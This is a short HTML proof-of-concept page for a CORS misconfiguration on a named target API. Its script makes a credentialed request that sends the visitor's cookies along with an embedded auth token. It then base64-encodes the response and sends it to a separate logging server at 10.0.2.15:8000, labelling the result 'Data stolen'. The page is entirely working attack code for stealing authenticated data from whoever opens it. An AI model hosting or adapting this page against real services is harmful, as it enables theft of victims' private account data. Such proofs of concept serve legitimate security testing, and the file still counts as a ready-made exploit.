<!DOCTYPE html>
<html>
  <body>
    <h2>CORS PoC — api.company-target.com</h2>
    <script>
      fetch("https://api.company-target.com/api/v3/ip.json?referer=https://slack.com%2Fcareers", {
        method: "POST",
        credentials: "include", // send cookies
        headers: {
          "Content-Type": "text/plain;charset=UTF-8"
        },
        body: JSON.stringify({
          src: "tag",
          auth: "ISTSgTgnTaAqQlubW6LBngVUhd6VoUEuTo36F2qy"
        })
      })
      .then(res => res.json())
      .then(data => {
        // Exfiltrate to your server
        fetch("http://10.0.2.15:8000/log?data=" + btoa(JSON.stringify(data)));
        console.log("Data stolen:", data);
      });
    </script>
  </body>
</html>
